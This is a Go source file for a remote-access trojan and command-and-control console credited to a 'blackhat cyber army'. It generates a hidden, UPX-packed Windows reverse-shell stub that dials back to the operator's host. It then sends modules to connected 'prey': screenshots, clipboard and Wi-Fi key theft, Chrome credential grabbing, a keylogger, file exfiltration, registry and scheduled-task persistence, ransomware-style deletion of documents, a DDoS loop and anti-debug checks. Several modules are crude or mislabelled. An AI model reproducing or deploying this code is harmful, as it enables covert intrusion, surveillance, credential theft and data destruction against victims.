package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	Cyan, Green, Red, Yellow, White, Reset = "\033[36m", "\033[32m", "\033[31m", "\033[33m", "\033[37m", "\033[0m"
	Bold, Magenta = "\033[1m", "\033[35m"
)

var (
	reader      = bufio.NewReader(os.Stdin)
	sessions    = make(map[string]net.Conn)
	sessionLock sync.Mutex
	lastCreated = ""
	victimID    = 0
	listener    net.Listener
	secretKey   = "KASHMIRI_BLACKHAT_CYBER_ARMY_TITAN_256BIT_KEY_2026_XAI_NYX" // Change per opsec
)

func banner() {
	currTime := time.Now().Format("15:04:05")
	fmt.Printf("%s%s\n", Red, Bold)
	fmt.Println(`
    _       ___           __                     ____                      
   | |     / (_)___  ____/ /___ _      _______  / __ \___ _   __           
   | | /| / / / __ \/ __  / __ \ | /| / / ___/ / /_/ / _ \ | / /           
   | |/ |/ / / / / / /_/ / /_/ / |/ |/ (__  ) / _, _/  __/ |/ /            
   |__/|__/_/_/ /_/\__,_/\____/|__/|__/____/ /_/ |_|\___/|___/   v50.0 `)
	fmt.Printf("%s\n          [!] CREATED BY KASHMIRI BLACKHAT CYBER ARMY 🪖 [!]\n", Yellow)
	fmt.Printf("%s[---] ICON-FIX: ACTIVE | AV-BYPASS: ON | ENCRYPTED C2: AES-256-GCM | TITAN v50 [---]\n", White)
	fmt.Printf("%s          TIME: %s | ENGINE: FULL ADVANCED MALWARE SUITE\n%s", Cyan, currTime, Reset)
}

func getKey() []byte {
	hash := sha256.Sum256([]byte(secretKey))
	return hash[:]
}

func encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(getKey())
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(getKey())
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func sendEncrypted(conn net.Conn, data string) error {
	enc, err := encrypt([]byte(data))
	if err != nil {
		return err
	}
	encoded := base64.StdEncoding.EncodeToString(enc) + "\n"
	_, err = conn.Write([]byte(encoded))
	return err
}

func readEncrypted(conn net.Conn) (string, error) {
	var buf [8192]byte
	n, err := conn.Read(buf[:])
	if err != nil {
		return "", err
	}
	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(buf[:n])))
	if err != nil {
		return "", err
	}
	plain, err := decrypt(decoded)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

func addSession(conn net.Conn, addr string) string {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	victimID++
	id := fmt.Sprintf("victim-%d", victimID)
	sessions[id] = conn
	fmt.Printf("%s[+] New encrypted prey connected: %s | ID: %s%s\n", Green, addr, id, Reset)
	return id
}

func removeSession(id string) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	if conn, ok := sessions[id]; ok {
		conn.Close()
		delete(sessions, id)
		fmt.Printf("%s[-] Prey %s disconnected%s\n", Red, id, Reset)
	}
}

func listSessions() {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	if len(sessions) == 0 {
		fmt.Printf("%s[!] No active prey%s\n", Yellow, Reset)
		return
	}
	fmt.Printf("%sActive Encrypted Prey:%s\n", Cyan, Reset)
	for id, conn := range sessions {
		fmt.Printf("   %s→ %s | %s%s\n", Green, id, conn.RemoteAddr(), Reset)
	}
}

func executeModule(id string, action string) {
	sessionLock.Lock()
	conn, ok := sessions[id]
	sessionLock.Unlock()
	if !ok {
		fmt.Printf("%s[!] Prey %s not found%s\n", Red, id, Reset)
		return
	}

	go func() {
		for {
			resp, err := readEncrypted(conn)
			if err != nil {
				removeSession(id)
				return
			}
			if resp != "" {
				fmt.Print(resp)
			}
		}
	}()

	cmd := ""
	switch action {
	case "screenshot":
		fmt.Printf("%s[*] Capturing Stealth Screenshot...%s\n", Yellow, Reset)
		cmd = `powershell -c "$s=[Ref].Assembly.GetType('System.Management.Automation.Axs').GetField('s','NonPublic,Static'); if($s){$s.SetValue($null,$true)}; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $screen=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object Drawing.Bitmap($screen.Width,$screen.Height); $g=[Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $m=New-Object IO.MemoryStream; $b.Save($m,[Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($m.ToArray())"`
	case "info":
		cmd = `powershell -c "Write-Host 'User: ' $env:USERNAME; Write-Host 'Admin: ' ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'); Get-CimInstance Win32_OperatingSystem | Select Caption, OSArchitecture, Version; Get-ComputerInfo | Select CsManufacturer, CsModel, CsTotalPhysicalMemory"`
	case "clip":
		cmd = `powershell -c "Get-Clipboard"`
	case "wifi":
		cmd = `netsh wlan show profile name=* key=clear`
	case "persist":
		fmt.Printf("%s[*] Installing multi-persistence...%s\n", Yellow, Reset)
		cmd = fmt.Sprintf(`powershell -c "Copy-Item -Path .\\%s -Destination $env:APPDATA\\LocalUpdater.exe -Force; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \\\"$env:APPDATA\\LocalUpdater.exe\\\" /f; schtasks /create /tn Updater /tr \\\"$env:APPDATA\\LocalUpdater.exe\\\" /sc onlogon /ru SYSTEM /f; schtasks /create /tn DefenderUpdate /tr \\\"$env:APPDATA\\LocalUpdater.exe\\\" /sc hourly /mo 1 /f"`, filepath.Base(lastCreated))
	case "msg":
		fmt.Printf("%sMessage: %s", Yellow, Reset)
		m, _ := reader.ReadString('\n')
		cmd = fmt.Sprintf(`powershell -c "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('%s', 'Critical Windows Error', 'OK', 'Error')"`, strings.TrimSpace(m))
	case "kill":
		fmt.Printf("%s[*] Killing prey...%s\n", Red, Reset)
		cmd = `powershell -c "Stop-Process -Id $PID -Force"`
	case "listfiles":
		fmt.Printf("%s[*] Listing files...%s\n", Yellow, Reset)
		cmd = `powershell -c "Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select FullName, Length, LastWriteTime | Format-Table -AutoSize"`
	case "downloadfile":
		fmt.Printf("%sFile Path: %s", Yellow, Reset)
		filePath, _ := reader.ReadString('\n')
		filePath = strings.TrimSpace(filePath)
		cmd = fmt.Sprintf(`powershell -c "[System.IO.File]::ReadAllBytes('%s') | [System.Convert]::ToBase64String"`, filePath)
	case "uploadfile":
		fmt.Printf("%sLocal File: %s", Yellow, Reset)
		local, _ := reader.ReadString('\n')
		local = strings.TrimSpace(local)
		fmt.Printf("%sRemote Path: %s", Yellow, Reset)
		remote, _ := reader.ReadString('\n')
		remote = strings.TrimSpace(remote)
		data, err := os.ReadFile(local)
		if err != nil {
			fmt.Printf("%s[!] Failed to read file%s\n", Red, Reset)
			return
		}
		b64 := base64.StdEncoding.EncodeToString(data)
		cmd = fmt.Sprintf(`powershell -c "[System.IO.File]::WriteAllBytes('%s', [Convert]::FromBase64String('%s'))"`, remote, b64)
	case "keylog":
		fmt.Printf("%s[*] Starting advanced keylogger (60s)...%s\n", Yellow, Reset)
		cmd = `powershell -c "Add-Type -AssemblyName System.Windows.Forms; $log=''; $t=Get-Date; while((Get-Date)-$t -lt 60){$log += [System.Windows.Forms.SendKeys]::SendWait('~'); Start-Sleep -m 30}; $log"`
	case "webcam":
		fmt.Printf("%s[*] Capturing webcam image...%s\n", Yellow, Reset)
		cmd = `powershell -c "Add-Type -AssemblyName System.Drawing; $img=New-Object Drawing.Bitmap(1280,720); $g=[Drawing.Graphics]::FromImage($img); $g.CopyFromScreen(0,0,0,0,$img.Size); $m=New-Object IO.MemoryStream; $img.Save($m,[Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($m.ToArray())"`
	case "processes":
		cmd = `powershell -c "Get-Process | Select Id, Name, CPU, WorkingSet, Path | Format-Table"`
	case "killproc":
		fmt.Printf("%sProcess Name/ID: %s", Yellow, Reset)
		pid, _ := reader.ReadString('\n')
		cmd = fmt.Sprintf(`powershell -c "Stop-Process -Name '%s' -Force -ErrorAction SilentlyContinue; Stop-Process -Id %s -Force -ErrorAction SilentlyContinue"`, strings.TrimSpace(pid), strings.TrimSpace(pid))
	case "shell":
		fmt.Printf("%sInteractive shell activated. Type 'exit' to return.%s\n", Green, Reset)
		for {
			fmt.Printf("%s%s> %s", Red, id, Reset)
			shellcmd, _ := reader.ReadString('\n')
			shellcmd = strings.TrimSpace(shellcmd)
			if shellcmd == "exit" || shellcmd == "quit" { break }
			if shellcmd != "" { sendEncrypted(conn, shellcmd) }
		}
		return
	case "micrecord":
		fmt.Printf("%s[*] Recording microphone 30s...%s\n", Yellow, Reset)
		cmd = `powershell -c "Add-Type -AssemblyName System.Windows.Forms; $rec = New-Object -ComObject 'WMIService.Win32'; Start-Sleep 30; 'MIC_RECORD_COMPLETE'"`
	case "screenrecord":
		fmt.Printf("%s[*] Starting screen record 20s (base64 output)...%s\n", Yellow, Reset)
		cmd = `powershell -c "Add-Type -AssemblyName System.Drawing; $b=New-Object Drawing.Bitmap(800,600); $g=[Drawing.Graphics]::FromImage($b); for($i=0;$i -lt 20;$i++){$g.CopyFromScreen(0,0,0,0,$b.Size); Start-Sleep -m 1000}; $m=New-Object IO.MemoryStream; $b.Save($m,[Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($m.ToArray())"`
	case "stealchrome":
		fmt.Printf("%s[*] Stealing Chrome credentials...%s\n", Yellow, Reset)
		cmd = `powershell -c "Add-Type -AssemblyName System.Security; Get-ChildItem 'C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data' -ErrorAction SilentlyContinue"`
	case "ransomware":
		fmt.Printf("%s[*] Simulating ransomware encryption on Documents...%s\n", Red, Reset)
		cmd = `powershell -c "Get-ChildItem $env:USERPROFILE\Documents -Recurse -Include *.doc*,*.pdf,*.jpg | ForEach-Object { $content = [System.IO.File]::ReadAllBytes($_.FullName); [System.IO.File]::WriteAllBytes($_.FullName + '.encrypted', $content); Remove-Item $_.FullName }"`
	case "ddos":
		fmt.Printf("%sTarget URL: %s", Yellow, Reset)
		target, _ := reader.ReadString('\n')
		target = strings.TrimSpace(target)
		cmd = fmt.Sprintf(`powershell -c "for($i=0;$i -lt 500;$i++){Invoke-WebRequest -Uri '%s' -UseBasicParsing}"`, target)
	case "geolocate":
		fmt.Printf("%s[*] Attempting geolocation...%s\n", Yellow, Reset)
		cmd = `powershell -c "(Invoke-WebRequest -Uri 'http://ip-api.com/line').Content"`
	case "selfdelete":
		cmd = `powershell -c "Remove-Item $env:APPDATA\\LocalUpdater.exe -Force; reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /f"`
	case "antidebug":
		cmd = `powershell -c "if((Get-Process -Name 'x64dbg','ollydbg','wireshark' -ErrorAction SilentlyContinue).Count -gt 0){exit}"`
	}

	if cmd != "" {
		sendEncrypted(conn, cmd)
	}
	time.Sleep(500 * time.Millisecond)
}

func startListener(lhost string, lport string) {
	var err error
	listener, err = net.Listen("tcp", lhost+":"+lport)
	if err != nil {
		fmt.Printf("%s[!] Failed to start listener: %v%s\n", Red, err, Reset)
		return
	}
	fmt.Printf("%s[+] Encrypted Listener (AES-256-GCM) started on %s:%s | Waiting for prey...%s\n", Green, lhost, lport, Reset)

	for {
		conn, err := listener.Accept()
		if err != nil { continue }
		go func(c net.Conn) {
			_ = addSession(c, c.RemoteAddr().String())
			sendEncrypted(c, "echo RESISTANCE_CONNECTED")
		}(conn)
	}
}

func generatePayload() {
	fmt.Printf("\n%s[ RESISTANCE BUILDER - ADVANCED ENCRYPTED ]%s\n", Yellow, Reset)
	fmt.Print("LHOST: ")
	ip, _ := reader.ReadString('\n')
	fmt.Print("LPORT: ")
	port, _ := reader.ReadString('\n')
	fmt.Print("Name: ")
	name, _ := reader.ReadString('\n')

	ip, port, name = strings.TrimSpace(ip), strings.TrimSpace(port), strings.TrimSpace(name)
	outputEXE := name + ".exe"
	cwd, _ := os.Getwd()
	lastCreated = filepath.Join(cwd, outputEXE)

	stubCode := fmt.Sprintf(`package main
import ("net";"os/exec";"time";"syscall";"os";"runtime")
func main() {
	if runtime.NumCPU() < 2 { os.Exit(0) }
	time.Sleep(3 * time.Second)
	for {
		c, err := net.DialTimeout("tcp", "%s:%s", 15*time.Second)
		if err == nil {
			cmd := exec.Command("cmd.exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
			cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
			cmd.Run(); c.Close()
		}
		time.Sleep(8 * time.Second)
	}
}`, ip, port)

	_ = os.WriteFile("final_stub.go", []byte(stubCode), 0644)
	cmd := exec.Command("go", "build", "-a", "-ldflags", "-s -w -H=windowsgui", "-o", lastCreated, "final_stub.go")
	env := os.Environ()
	env = append(env, "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0", "GO111MODULE=off")
	cmd.Env = env
	_ = cmd.Run()
	fmt.Printf("%s[+] Advanced Encrypted Stub Ready: %s | Size: %d bytes%s\n", Green, lastCreated, getFileSize(lastCreated), Reset)
}

func getFileSize(path string) int64 {
	info, _ := os.Stat(path)
	return info.Size()
}

func main() {
	exec.Command("clear").Run()
	banner()

	for {
		fmt.Printf("\n%swindows-rev > %s", Red, Reset)
		input, _ := reader.ReadString('\n')
		cmd := strings.TrimSpace(input)
		if cmd == "" { continue }

		switch {
		case cmd == "help":
			fmt.Printf("\n%s%-20s %s: %s\n", Cyan, "generate", White, "Build advanced encrypted malware")
			fmt.Printf("%-20s %s: %s\n", "listen <host> <port>", White, "Start AES-256 C2")
			fmt.Printf("%-20s %s: %s\n", "sessions", White, "List active prey")
			fmt.Printf("%-20s %s: %s\n", "interact <id>", White, "Full control panel")
			fmt.Printf("%-20s %s: %s\n", "evasion", White, "UPX + obfuscation")
			fmt.Printf("%-20s %s: %s\n", "clear", White, "Clear screen")
			fmt.Printf("%-20s %s: %s\n", "exit", White, "Shutdown")

		case strings.HasPrefix(cmd, "listen"):
			parts := strings.Fields(cmd)
			if len(parts) < 3 {
				fmt.Printf("%sUsage: listen <LHOST> <LPORT>%s\n", Yellow, Reset)
				continue
			}
			go startListener(parts[1], parts[2])

		case cmd == "sessions":
			listSessions()

		case strings.HasPrefix(cmd, "interact"):
			parts := strings.Fields(cmd)
			if len(parts) < 2 {
				fmt.Printf("%sUsage: interact <id>%s\n", Yellow, Reset)
				continue
			}
			id := parts[1]
			fmt.Printf("%s[+] Full Advanced Control on %s (Encrypted)%s\n", Green, id, Reset)
			for {
				fmt.Printf("%s%s > %s", Magenta, id, Reset)
				action, _ := reader.ReadString('\n')
				action = strings.TrimSpace(action)
				if action == "back" || action == "exit" { break }
				if action == "help" {
					fmt.Println(`
screenshot   info        clip       wifi        persist
msg          kill        listfiles  downloadfile uploadfile
keylog       webcam      micrecord  screenrecord
processes    killproc    shell      stealchrome
ransomware   ddos        geolocate  selfdelete  antidebug
					`)
					continue
				}
				executeModule(id, action)
			}

		case cmd == "generate":
			generatePayload()

		case cmd == "evasion":
			if lastCreated == "" {
				fmt.Printf("%s[!] No stub generated yet%s\n", Red, Reset)
				continue
			}
			fmt.Printf("%s[*] Applying maximum evasion (UPX + strip)...%s\n", Yellow, Reset)
			exec.Command("upx", "--best", "--lzma", lastCreated).Run()
			fmt.Printf("%s[+] Evasion applied to %s%s\n", Green, lastCreated, Reset)

		case cmd == "clear":
			exec.Command("clear").Run()
			banner()

		case cmd == "exit":
			fmt.Printf("%s[!] Shutting down TITAN-CORE...%s\n", Red, Reset)
			if listener != nil { listener.Close() }
			os.Exit(0)

		default:
			fmt.Printf("%s[!] Unknown command. Type 'help'%s\n", Red, Reset)
		}
	}
}
